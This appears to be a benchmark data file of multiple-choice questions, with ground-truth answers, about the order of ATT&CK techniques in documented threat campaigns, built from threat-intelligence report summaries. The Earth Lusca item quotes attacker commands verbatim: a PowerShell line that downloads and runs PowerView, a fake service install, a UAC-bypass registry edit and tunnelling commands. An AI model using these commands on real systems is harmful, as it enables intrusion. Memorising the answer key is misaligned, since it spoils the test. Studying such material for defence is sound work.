Question ID,AttackSeq ID,Batch ID,Question,A,B,C,D,Key Points,Context,Ground Truth,Source,Unshuffled Choices
155,118,118-Collection-T1074-Data Staged,"After the PowerLess Backdoor performed credential dumping using known LOLBIN techniques and carried out local account discovery, which ATT&CK technique most likely occurred before the PowerLess Backdoor communicated with its C2 server using encrypted channels?",T1074-Data Staged,T1542.004-ROMMONkit,T1557.003-DHCP Spoofing,T1102-Web Service,"Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",T1074-Data Staged,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage,"T1074-Data Staged, T1557.003-DHCP Spoofing, T1102-Web Service, T1542.004-ROMMONkit"
1738,319,319-Lateral Movement-T1550-Use Alternate Authentication Material,"During the Fox Kitten Campaign, after utilizing tools like 'STSRCheck' and 'PORT.EXE' for discovery and before establishing command and control with mechanisms such as POWSSHNET for RDP over SSH tunneling, which ATT&CK technique most likely enabled lateral movement within the network?",T1546.013-PowerShell Profile,T1550-Use Alternate Authentication Material,T1003-OS Credential Dumping,T1563-Remote Service Session Hijacking,Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.,"Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",T1550-Use Alternate Authentication Material,ClearSky-Fox-Kitten-Campaign-v1,"T1550-Use Alternate Authentication Material, T1563-Remote Service Session Hijacking, T1003-OS Credential Dumping, T1546.013-PowerShell Profile"
2227,376,376-Discovery-T1046-Network Service Discovery,"Which ATT&CK technique most likely occurred after Earth Lusca used tools such as HUC Port Banner Scanner and nbtscan to scan for NetBIOS name information and shared folders during Discovery, and before they transferred tools and established network tunnels for Lateral Movement?",T1574-Hijack Execution Flow,T1046-Network Service Discovery,T1518-Software Discovery,T1036.007-Double File Extension,"Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",T1046-Network Service Discovery,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations,"T1046-Network Service Discovery, T1518-Software Discovery, T1574-Hijack Execution Flow, T1036.007-Double File Extension"
546,169,169-Resource Development-T1583-Acquire Infrastructure,"Before visitors to the compromised websites were exposed to browser fingerprinting exploits for initial access and malicious scripts communicated with the C&C servers using HTTPS, which ATT&CK technique most likely involved acquiring domain names and renting servers to support the attack?",T1566-Phishing,T1561-Disk Wipe,T1583-Acquire Infrastructure,T1584.006-Web Services,"Resource Development: The threat actors acquired domain names from multiple registrars, including Njalla, and rented servers from various hosting companies, predominantly ServerAstra in 2020. They compromised over twenty high-profile websites to inject JavaScript code that would load additional malicious code from their command and control (C&C) servers.","Initial Access: Visitors to the compromised websites were potentially exposed to exploits after their browsers were fingerprinted. Additionally, the threat actors engaged in spearphishing campaigns, sending emails with malicious Word documents containing Visual Basic for Applications (VBA) macros.
Execution: The malicious Word documents contained VBA macros that executed code using the Document_Open function.
Command and Control: The scripts from the watering hole attacks communicated with the C&C servers using HTTPS.
Others: The campaign targeted high-profile organizations in the Middle East, with a focus on Yemen. The attackers likely purchased Candiru implants and exploits. The campaign involved strategic web compromises, where the attackers modified legitimate websites to inject malicious scripts. The campaign went quiet after July 2021, possibly due to the threat actors retooling after publications by Citizen Lab, Google, and Microsoft detailed Candiru's activities. A comprehensive list of Indicators of Compromise (IoCs) and samples is available on GitHub.",T1583-Acquire Infrastructure,Strategic web compromises in the Middle East with a pinch of Candiru _ WeLiveSecurity,"T1583-Acquire Infrastructure, T1584.006-Web Services, T1566-Phishing, T1561-Disk Wipe"
57,105,105-Initial Access-T1566-Phishing,"Before attackers leveraged the Initial Access tactic to send over 500,000 phishing emails daily via Emotet to spread malware, which subsequently delivered Trickbot spyware, which ATT&CK technique most likely occurred to facilitate further delivery of malicious payloads?",T1027-Obfuscated Files or Information,T1566.001-Spearphishing Attachment,T1542.004-ROMMONkit,T1566-Phishing,"Initial Access: The Emotet trojan, which resurfaced in July, is spread via phishing emails and has downloader functionality, enabling it to deliver other malware. Emotet initially spread Trickbot spyware, which after collecting information opened up access to Ryuk and Conti ransomware. Later, attackers installed the QakBot (QBot) banking trojan on victim computers. Emotet sends more than 500,000 emails daily on weekdays, excluding weekends, and uses message threads on the infected computer for spreading.","Defense Evasion: Attackers are getting creative about hiding their tracks to maintain stealth, even against sandboxes. One incident involved a special malicious plugin (PhysXPluginMfx) for Autodesk 3ds Max, which remained inactive if Task Manager or Process Monitor was running. Zeppelin ransomware returned with a new downloader that evades dynamic analysis in a sandbox by stopping malicious activity for 26 seconds after the downloader performs its work.
Impact: Ransomware attacks have increased, with over half of all malware attacks involving ransomware. Notable ransomware families include Netwalker, REvil, Maze, DoppelPaymer, and RansomEXX. Attackers often steal data before encrypting the victim's copy and demand ransoms for decryption and non-disclosure. Manufacturing and industry, as well as healthcare, were particularly targeted. In healthcare, Ryuk ransomware attacked Universal Health Services, disrupting patient care. REvil attacked Valley Health hospitals, stealing and publishing patient medical data. SunCrypt ransomware attacked University Hospital New Jersey, stealing and publishing patient records.
Others: The number of cyberattacks grew by 2.7% in Q3 2020 compared to Q2, and by 54% compared to Q3 2019. Ransomware is increasingly prevalent, with 51% of malware attacks using ransomware in Q3. Manufacturing and industrial companies, as well as healthcare institutions, are primary targets. The percentage of social engineering attacks using COVID-19 as a lure fell from 16% in Q2 to 4% in Q3. Hacking as an attack method on companies grew by 12 percentage points to 30%, likely due to the pandemic and the transition to working from home. Vulnerabilities in services on the perimeter of corporate systems are being actively exploited. To protect from cyberattacks, it is recommended to follow guidelines for personal and corporate cybersecurity, including a well-organized vulnerability management process, security solutions like WAF, traffic analysis, SIEM systems, and verifying email attachments in a sandbox.",T1566-Phishing,Cybersecurity_threatscape-2020-Q3.ENG,"T1566-Phishing, T1566.001-Spearphishing Attachment, T1027-Obfuscated Files or Information, T1542.004-ROMMONkit"
572,173,173-Initial Access-T1566-Phishing,"Before Sofacy used phishing techniques to steal credentials through fake login pages for webmail and two-factor authentication platforms, which ATT&CK technique most likely enabled the registration of new domain names mimicking legitimate organizations to prepare for the phishing campaign?",T1189-Drive-by Compromise,T1584.003-Virtual Private Server,T1606-Forge Web Credentials,T1566-Phishing,"Initial Access: Sofacy, a threat group, has been observed registering new domain names that closely resemble those of legitimate organizations. These domains are linked through shared WHOIS data and infrastructure, suggesting the preparation for a new phishing campaign. The domains mimic entities in various sectors, including international and European diplomatic institutions, web service providers, military institutions, contractors and conferences, energy companies, and news organizations in the US and Central Europe.","Defense Evasion: The Sofacy attackers have employed phishing techniques to steal credentials, using obfuscated code to redirect users to malicious webpages. In some instances, they have disabled the malicious redirect, opting to send users to legitimate sites instead. They have created fake login pages for webmail and two-factor authentication platforms, requiring simultaneous login attempts by the attackers when victims are logging in. The phishing pages are designed to closely resemble the legitimate sites they are impersonating, making it difficult for users to detect the deception.
Credential Access: Sofacy has used phishing techniques to steal credentials, including setting up fake login pages for webmail and two-factor authentication platforms. The attackers have shown dedication by attempting to log in simultaneously with the victims. The phishing pages are crafted to look like legitimate sites, making it difficult for users to recognize the fraud.
Others: The CTI report from PricewaterhouseCoopers LLP dated 2014-10-22 details a phishing campaign by the threat group Sofacy. The campaign targets various sectors with fake domains and phishing pages. The report includes Snort signatures to detect potential Sofacy phishing redirects and advises on educating staff to identify suspicious emails. For further information and indicators of compromise, contact is provided via threatintelligence@uk.pwc.com. An extensive list of domains associated with the campaign is appended.",T1566-Phishing,tactical-intelligence-bulletin---sofacy-phishing-,"T1566-Phishing, T1189-Drive-by Compromise, T1606-Forge Web Credentials, T1584.003-Virtual Private Server"
2174,374,374-Reconnaissance-T1598-Phishing for Information,"Before the attackers achieved initial access in the Freakyshelly targeted attack via spear phishing emails containing OLE2 format documents, which ATT&CK technique was likely utilized to gather details about the software installed on the victim's computer, including the Microsoft Office version?",T1566-Phishing,T1598-Phishing for Information,T1597.002-Purchase Technical Data,T1648-Serverless Execution,"Reconnaissance: The CTI report by Securelist authors Alexander Liskin, Anton Ivanov, and Andrey Kryukov, dated September 18, 2017, details a reconnaissance technique used in the Freakyshelly targeted attack. The attackers utilized spear phishing emails with OLE2 format attachments that contained no active content but had links to PHP scripts on third-party web resources. When opened in Microsoft Word, the application sent a GET request to one of the links, thereby informing the attackers about the software installed on the victim's computer, including the Microsoft Office version.","Initial Access: The CTI report indicates that the initial access vector in the Freakyshelly targeted attack was through spear phishing emails. The emails contained OLE2 format documents with embedded links that, when opened in Microsoft Word, would send a GET request to the attacker's server.
Defense Evasion: The CTI report describes a defense evasion technique where the attackers used an undocumented Word feature to avoid detection. The documents attached to the spear phishing emails contained no macros, exploits, or any other active content, making them appear benign and bypassing security measures.
Others: The CTI report uncovers an undocumented feature in Microsoft Word that was abused by attackers. The feature involves the INCLUDEPICTURE field, which can contain a link to an image. However, in the attack, the link was in Unicode, causing Word to ignore it but still follow a URL attached to a form within the document. This URL was the actual link that Word followed when the document was opened, leading to the attackers' server. The report also notes that this feature is present in Microsoft Office for iOS and Android but not in LibreOffice or OpenOffice. Kaspersky Lab's security products can detect the use of this technique and find links embedded in documents using the same method.",T1598-Phishing for Information,An (un)documented Word feature abused by attackers _ Securelist,"T1598-Phishing for Information, T1597.002-Purchase Technical Data, T1566-Phishing, T1648-Serverless Execution"
615,176,176-Reconnaissance-T1595-Active Scanning,"Before gaining initial access by remotely controlling software or creating new local accounts on internal hosts, which ATT&CK technique most likely involved the use of tools for enumerating services, authenticating via brute force, and scanning ports?",T1595-Active Scanning,T1590.001-Domain Properties,T1090.002-External Proxy,T1197-BITS Jobs,"Reconnaissance: The CTI report details the use of various tools by attackers to probe and compromise IP addresses, including Medusa, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, nPCA Bruter, Fast RDP Brute GUI v2.0 package, Sentry MBA, RealVNC viewer 5.2.3, Cain and Abel, and RDP Scanner X. These tools were used to enumerate services, authenticate via brute force, fingerprint remote SMTP servers, scan ports, and authenticate on VNC and RDP ports.","Initial Access: The attackers gained initial access to hosts using tools such as Advanced IP Scanner, Radmin, PushVNC package, Fgdump, Dameware, VNC Password Recovery Tool, and xDedic RDP Patch. These tools helped identify internal hosts, remotely control software, push and start VNC services, extract password hashes, and create new local accounts.
Defense Evasion: Attackers used AutoExe1.bat to download malware using BITS, clear system events, and delete traces of their activity. They also used AutoExe.bat to load Neutrino/Kasidet variants with PoS functionality, combining previous batch files Setup.bat and ClearEventN.bat. Tools like xDedic RDP Patch were used to maintain access even after password changes.
Others: The report discusses the use of PoS malware threats such as NewPOSThings, Project Hook, PwnPOS, Alina, and Kasidet/Neutrino, which share file characteristics, distribution methods, and sources. Gorynych, a modular botnet client, was retrofitted to use BlackPOS and target PoS systems. Spy Net RAT was used for remote access and control, with capabilities like password grabbing and keylogging. The report also covers victimology, indicating that SMBs were common targets due to open ports for outsourced IT services or remote access by in-house IT admins. Attribution is uncertain, but tools used for initial entry are commonly discussed in security forums, and some file names suggest a Central European language origin. The report concludes with recommendations for both small and large organizations to secure their networks and monitor for threats.",T1595-Active Scanning,Operation_Black Atlas_Technical_Brief,"T1595-Active Scanning, T1590.001-Domain Properties, T1197-BITS Jobs, T1090.002-External Proxy"
420,153,153-Reconnaissance-T1592-Gather Victim Host Information,"During the sequence in which adversaries exploited MEGA cloud service and unprotected MongoDB database to gain initial access, which ATT&CK technique most likely occurred before these initial access methods to support their operations?",T1027-Obfuscated Files or Information,T1590-Gather Victim Network Information,T1649-Steal or Forge Authentication Certificates,T1592-Gather Victim Host Information,"Reconnaissance: The ENISA Threat Landscape report indicates that adversaries have been actively gathering information to support their cyber operations. This includes exploiting known vulnerabilities and using social engineering techniques such as phishing to collect sensitive data. The Lazarus Group, for example, has been reported to be more active in both financially and espionage motivated attacks, targeting cryptocurrency trading platform users and their systems. The report also mentions that adversaries have been targeting the technology industry to compromise the supply chain and look for vulnerabilities to exploit.","Initial Access: The report details several incidents where adversaries gained initial access through various means. Notably, the MEGA cloud service suffered a data breach exposing a vast number of emails and passwords. Verification.io experienced a significant data breach due to an unprotected MongoDB database, exposing over 800 million records. The Citrix systems were compromised by exploiting critical software vulnerabilities and employing password spraying techniques. Additionally, the cloud hosting provider iNSYNQ was attacked with ransomware, preventing customers from accessing their data.
Execution: The report highlights that installing malware is a common technique used by adversaries during the execution phase of an attack. Malware such as Emotet and Agent Tesla were frequently used to facilitate reconnaissance, lateral movement, data theft, and communication with C2 servers.
Defense Evasion: Adversaries have been using various defense evasion techniques, including the use of encrypted HTTPS connections to deliver malware, as reported in the ENISA Threat Landscape. This makes it challenging for security systems to detect and prevent such threats.
Credential Access: Credential stealing has been a significant part of cyberattacks, with adversaries using various methods to obtain sensitive authentication data. The report mentions that companies experience an average of 12 credential-stuffing attacks each month, where attackers successfully identify valid credentials.
Others: The ENISA Threat Landscape report discusses the impact of the COVID-19 pandemic on cybersecurity, noting an increase in attacks targeting healthcare service providers and remote workers. The Brno University Hospital in the Czech Republic, a major COVID-19 testing laboratory, suffered a cyberattack during the pandemic. ENISA has been mapping the threat landscape during this period and advising on mitigation measures to reduce exposure to threats.",T1592-Gather Victim Host Information,ETL2020_Incidents_A4,"T1592-Gather Victim Host Information, T1590-Gather Victim Network Information, T1027-Obfuscated Files or Information, T1649-Steal or Forge Authentication Certificates"
2140,367,367-Command and Control-T1071-Application Layer Protocol,"Before additional C2 domains such as jack-fruit[.]club and camilleoconnell[.]website were identified through pivoting on Googlebot-like user agent strings, which ATT&CK technique most likely occurred to establish communication with the initial C2 domain judystevenson[.]info?",T1001.001-Junk Data,T1595.001-Scanning IP Blocks,T1071-Application Layer Protocol,T1566-Phishing,"Command and Control: The initial malware sample communicated with the C2 domain judystevenson[.]info. Further analysis using the Augury Malware addon identified eight additional malware samples using the same C2. These samples also dropped a file named C:\ProgramData\GUID.bin, which was used as a pivot point to discover 18 more samples. Five additional C2 domains were identified: escanor[.]live, jaime-martinez[.]info, krasil-anthony[.]icu, nicoledotson[.]icu, and ruthgreenrtg[.]live. Pivoting on ImpHash values and the AV signature Win32/Revokery.J led to the discovery of five more associated samples and two more C2 domains: benyallen[.]club and chad-jessie[.]info. A user agent string resembling Googlebot was used as another pivot, identifying approximately 600 samples and four more samples with a distinctive URL pattern. This led to the identification of five more C2 domains: jack-fruit[.]club, lordblackwood[.]club, angeladeloney[.]info, overingtonray[.]info, and camilleoconnell[.]website. In total, 40 malware samples were identified, communicating with 13 C2 domains.","Initial Access: On November 27, 2020, a Twitter user @BaoshengbinCumt, associated with Qihoo, reported a malware hash faff57734fe08af63e90c0492b4a9a56, attributing it to the threat actor AridViper (APT-C-23 / GnatSpy). This malware was delivered via a malicious document disguised as a Curriculum Vitae, likely as part of a phishing campaign. The malware, once executed, made a POST request to the C2 domain judystevenson[.]info.
Others: Passive DNS data was obtained for the identified hostnames, revealing that most of them are associated with NAMECHEAP-NET in the US, except for camilleoconnell[.]website, which is associated with UCOM ARTERIA Networks Corporation in Japan. The use of NameCheap infrastructure has been previously observed in analyses of AridViper's activities.",T1071-Application Layer Protocol,Mapping out AridViper Infrastructure Using Augury’s Malware Module – Team Cymru,"T1071-Application Layer Protocol, T1001.001-Junk Data, T1566-Phishing, T1595.001-Scanning IP Blocks"
1907,339,339-Defense Evasion-T1027-Obfuscated Files or Information,Which ATT&CK technique most likely occurred before Lampion employed anti-debug and anti-VM techniques utilizing VMProtect 3.x to evade analysis?,T1566-Phishing,T1578.001-Create Snapshot,T1124-System Time Discovery,T1027-Obfuscated Files or Information,"Defense Evasion: The Lampion trojan employs anti-debug and anti-VM techniques to evade analysis. It uses VMProtect 3.x to protect its code, making manual analysis and sandbox detection difficult. The trojan also includes a large amount of junk data within its files to hinder detection by antivirus engines.","Initial Access: The CTI report from seguranca-informatica.pt, authored by Pedro Tavares, details a phishing campaign targeting Portuguese users with emails mimicking the Portuguese Government Finance & Tax. The emails, which discuss issues related to a debt from 2018, contain links that download a zip file named 'FacturaNovembro-4492154-2019-10_8.zip' from an online server. This file, once extracted, reveals three files, one of which is a VBScript file acting as a dropper and downloader for the Lampion trojan.
Execution: The Lampion trojan's execution begins when the victim clicks on a link in the phishing email, which downloads a zip file containing a VBScript file. This file, once executed, downloads two additional files: 'P-19-2.dll' and '0.zip'. The 'P-19-2.dll' file is executed at system startup and invokes the second file, '0.zip', which contains a DLL with additional code for the trojan's operation.
Persistence: The Lampion trojan achieves persistence by creating a .lnk file in the Windows StartUp folder, which triggers the execution of the trojan every time the victim's computer starts. Additionally, a new VBS file is created to execute the trojan upon system startup.
Command and Control: The Lampion trojan communicates with a C2 server to send collected data, including details from the computer's disk, opened windows, clipboard, and banking credentials. The C2 server is not detected as malicious by antivirus agents at the time of the report.
Others: The CTI report includes indicators of compromise (IOCs) such as URLs, hashes, and Yara rules for detecting the Lampion trojan. The report also mentions efforts to decommission the domains and C2 server associated with the trojan by contacting Amazon Web Services (AWS). Despite these efforts, malicious endpoints were still active at the time of the report's writing.",T1027-Obfuscated Files or Information,Targeting Portugal_ A new trojan 'Lampion' has spread using template emails from the Portuguese Government Finance & Tax,"T1027-Obfuscated Files or Information, T1578.001-Create Snapshot, T1566-Phishing, T1124-System Time Discovery"
2679,64,64-Command and Control-T1071-Application Layer Protocol,Which ATT&CK technique most likely occurred before ZoxPNG established initial contact with the C2 server through HTTP GET requests by sending a PNG file containing instructions or data?,T1071-Application Layer Protocol,T1568.001-Fast Flux DNS,T1110.004-Credential Stuffing,T1106-Native API,"Command and Control: ZoxPNG communicates with the C2 server using HTTP requests, with the first GET request establishing initial contact. Subsequent requests may use GET or POST, depending on whether data needs to be sent to the C2 server. The C2 server responds with a PNG file containing the next instruction. ZoxPNG is resilient to network instability, retrying connections multiple times with delays.","Execution: ZoxPNG is a simple RAT that uses the PNG image file format for data transmission with the C2 server. It supports 13 native commands and can execute arbitrary code from the C2 server. ZoxPNG requires the attacker to specify the C2 server address as a command line argument. Upon activation, it registers command handlers and enters a loop for communication and command dispatch, attempting to reconnect to the C2 server after any communication failures.
Defense Evasion: ZoxPNG uses the WinInet API for HTTP communication, which allows it to automatically use proxy settings configured on the victim's machine. It sends a VictimSystemData structure in the HTTP Cookie header, which includes a checksum of the victim's computer name to detect corrupt or forged requests. The communication pattern includes HTTP GET and POST requests with a PNG file containing instructions or data.
Others: ZoxPNG's communication with the C2 server is based on a polling model, with the binary attempting to contact the C2 server up to five times with 5-second intervals between attempts. The communication subsystem uses standard Base64 encoding to transfer data without NULL byte issues. The PNG file format is used for data transmission, adhering to the PNG standard to reduce detectability. ZoxPNG can be detected over the network by looking for a specific static string in the traffic. On disk, the same string can be used for detection with a YARA signature. Known samples of ZoxPNG have been identified, with some signed using a certificate from '4NB Corp.' The malware has evolved from an earlier variant known as ZoxRPC, which targeted specific regional versions of Windows and used the MS08-067 vulnerability.",T1071-Application Layer Protocol,ZoxPNG_Full_Analysis-Final,"T1071-Application Layer Protocol, T1568.001-Fast Flux DNS, T1106-Native API, T1110.004-Credential Stuffing"
